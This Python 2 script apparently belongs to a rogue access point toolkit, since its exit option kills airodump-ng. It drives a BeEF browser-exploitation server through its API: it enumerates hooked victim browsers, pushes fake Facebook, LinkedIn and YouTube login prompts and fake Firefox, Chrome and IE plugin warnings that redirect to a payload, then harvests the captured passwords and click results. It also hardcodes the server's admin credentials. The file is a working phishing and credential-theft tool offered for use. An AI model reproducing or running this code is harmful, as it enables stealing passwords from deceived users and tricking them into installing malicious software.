import sys, os, time, requests, signal, json, pprint, sqlite3
from collections import MutableMapping
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from browser_db_router import *


class Browser_Parser:


	def __init__(self):
		self.user_id =  sys.argv[1:][0]
		print str(self.user_id)
		self.browser_db_router= Browser_DB_Router(self.user_id)
		self.uname = "beef"
		self.pword = "eaterGin308"
		self.cert_key = "/opt/beef/beef_key.pem"
		self.cert_cert = "/opt/beef/beef_cert.pem"
		self.redirect_url = 'https://192.168.3.1/sheep.jpg'
		self.browser_id = None
		self.cert = (self.cert_cert, self.cert_key)
		self.api_key = self.get_api_key()
		self.login_promt_id = None
		self.toolbar_prompt_id = None
		self.menu()

	def get_api_key(self):
		hed = "Content-Type: application/json"
		to_beef_serv = {'username' : self.uname, 'password' : self.pword}
		k_une = requests.post(url="https://192.168.3.1:3000/api/admin/login", cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		return k_dict['token']

	def promt_fake_login(self):
		#if self.login_promt_id is None: ./RAP.sh st
		socnet_choice= raw_input("fake login to send:")
		if socnet_choice.lower() == 'facebook':
			socnet_choice = 'Facebook'
		elif socnet_choice.lower() == 'linkedin':
			socnet_choice = 'LinkedIn'
		elif socnet_choice.lower() == 'youtube':
			socnet_choice = 'YouTube'
		elif socnet_choice.lower() == 'generic':
			socnet_choice = 'Generic'
		elif socnet_choice.lower() == 'youtube':
			socnet_choice = 'Youtube'
		else:
			print "please pick a social network"
			return None
		hed = "Content-Type: application/json; charset=UTF-8"
		to_beef_serv = {'choice': socnet_choice }
		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/242?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		if k_dict['success'] == "true":
			print "successfully sent prompt..."
			print "command id:" + str(k_dict['command_id'])
			self.login_promt_id = k_dict['command_id']
			self.browser_db_router.update_BrowserTable_Login_Cmd(self.user_id, self.login_promt_id)
		else:
			print "prompt request unsucessful"
			return None


	def fake_toolbar(self, redirect_url):
		if self.browser_id is None:
			print "find some browsers first"
			return None
		toolbar_type = raw_input("toolbar to send:")
		if toolbar_type.lower() == 'firefox':
			command_id = 252
			notification = "An additional plug-in is required to display some elements on this page."
		elif toolbar_type.lower() == 'chrome':
			command_id = 256
			notification = "Additional plugins are required to display all the media on this page."
		elif toolbar_type.lower() == 'ie':
			command_id = 263
			notification = "This website wants to run the following applet: 'Java' from 'Microsoft Inc'. To continue using this website you must accept the following security popup"
		else:
			print 'please give a valid choice'
			return None
		hed = "Content-Type: application/json; charset=UTF-8"
		params= {"url" : self.redirect_url, 'notification_text' : notification}
		f_f = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/" + str(command_id) + "?token=" + str(self.api_key), cert=self.cert, verify=False, json=params)
		f_f = json.loads(f_f.text)
		if f_f['success'] == "true":
			print "successfully sent prompt..."
			print "command id:" + str(f_f['command_id'])
			self.toolbar_prompt_id = command_id
			self.browser_db_router.update_BrowserTable_Toolbar_Cmd(self.user_id, str(f_f['command_id']))
		else:
			print "prompt request unsucessful"
			return None

	def get_prompt_credentials(self, account):
		if self.browser_id is None:
			print "find some browsers first"
			return None
		idee = self.browser_db_router.get_browser_login_cmd(self.user_id)
		command_id = self.browser_db_router.get_browser_session_id(self.user_id)
		dets = requests.get(url="https://192.168.3.1:3000/api/modules/" 
			+ str(self.browser_id) 
			+ "/242/" + str(idee) 
			+ "?token=" 
			+ str(self.api_key), cert = self.cert, verify=False)
		c_dict = json.loads(dets.text)
		try:
			pprint.pprint(c_dict)
			data = json.loads(c_dict['0']['data'])
			password = str(data['data']).split(":")[1]
			#send to password table with account as ususal
			print password
			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 1)
		except KeyError:
			print("did not get response yet")
			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 0)


	def get_toolbar_result(self):
		#if toolbar prompt id is none, return
		idee = self.browser_db_router.get_browser_toolbar_cmd(self.user_id)
		print str(idee)
		self.browser_id = self.browser_db_router.get_browser_session_id(self.user_id)
		print str(self.browser_id)
		print(str("toolbar_prompt_id:" + str(self.toolbar_prompt_id)))
		dets = requests.get(url='https://192.168.3.1:3000/api/modules/'
			+ str(self.browser_id)
			+ '/' + str(self.toolbar_prompt_id) + '/' + str(idee)
			+"?token="
			+str(self.api_key), cert=self.cert, verify=False)
		c_dict= json.loads(dets.text)
		try:
			if c_dict['1']:
				print "user has clicked on the toolbar"
				return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 1)
		except KeyError as ke:
			print "user has not clicked on toolbar"
			return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 0)


	def get_hooked_browsers(self):
		hooked_browsers = {}
		urll = 'https://192.168.3.1:3000/api/hooks?token=' + str(self.api_key)
		k_une = requests.get(url=urll,  cert = self.cert, verify=False)
		k_dict = json.loads(k_une.text)
		if k_dict['hooked-browsers']['online']:
			print "found currently-hooked browser:"
			for key in k_dict['hooked-browsers']['online']['0']:
				if key == 'session':
					browser_id = k_dict['hooked-browsers']['online']['0']['session']
				elif key == 'page_uri':
					self.redirect_uri = k_dict['hooked-browsers']['online']['0']['page_uri']
				else:
					hooked_browsers[str(key)] = str(k_dict['hooked-browsers']['online']['0'][key])
			pprint.pprint(hooked_browsers)
			print "browser session id: " + str(browser_id)
			self.browser_id = browser_id
			self.browser_db_router.update_BrowserTable_Session_id(self.user_id, self.browser_id)
			return self.get_browser_deets(self.browser_id)
		else:
			print "no hooked browser found"
			return None

	def get_browser_deets(self, browser_id):
		urll = 'https://192.168.3.1:3000/api/hooks/' + str(browser_id) + "?token=" + str(self.api_key)
		k_une = requests.get(url=urll, cert=self.cert, verify=False)
		k_dict = json.loads(k_une.text)
		pprint.pprint(k_dict)
		self.browser_db_router.insert_into_BrowserTable(self.user_id, browser_id, k_dict['BrowserReportedName'], k_dict['BrowserVersion'], k_dict['OsName'], k_dict['BrowserPlugins'], self.browser_id, '0', '0')


	def get_module_deets(self):
		#debug: helper to get details on modules, delete after use
		det = requests.get(url="https://192.168.3.1:3000/api/modules/252?token=" + str(self.api_key), cert=self.cert, verify=False)
		pprint.pprint(json.loads(det.text)) 
		# 242 --> pretty theft, 252 --> firefox fake notification, 256 --> chrome fake bar, 263 --> IE fake bar


	def save_hooked_browser_details(self):
		#get hooked browsers --> get browser details
		return self.get_hooked_browsers()

	def check_toolbars(self):
		pass

	def check_lastpass(self):
		pass

	def check_popup_blocker(self):
		pass

	def check_adblock(self):
		pass

	def check_antivirus(self):
		pass

	def menu(self):
		print("*****BROWSER ANALYZER*****")
		picd = True
		while picd:
			resp = input("please select an option number:\n" \
							"0.See browser DB\n" \
							"1.Save hooked browser details\n" \
							"2.Display fake login\n"\
							"3.Display fake toolbar\n"\
							"4.Save fake login results\n"\
							"5.Save fake toolbar results\n"\
							"6.Check for LastPass\n"\
							"7.Check for installed toolbars\n"\
							"8.Exit\n")
			try:
				resp = int(resp)
			except ValueError:
				pass
			if resp not in range(0,9):
				pass
			else:
				picd = False
		if resp == 0:
			self.browser_db_router.show_browser_db(self.user_id)
			self.menu()
		elif resp == 1:
			self.save_hooked_browser_details()
			self.menu()
		elif resp == 2:
			self.promt_fake_login()
			self.menu()
		elif resp == 3:
			self.fake_toolbar(self.redirect_url)
			self.menu()
		elif resp == 4:
			account = raw_input("please select account:")
			self.get_prompt_credentials(account)
			self.menu()
		elif resp == 5:
			self.get_toolbar_result()
			self.menu()
		elif resp == 8:
			os.system("sudo pkill airodump-ng && sudo pkill python") 
			sys.exit(0)

if __name__ == "__main__":
	bp = Browser_Parser()
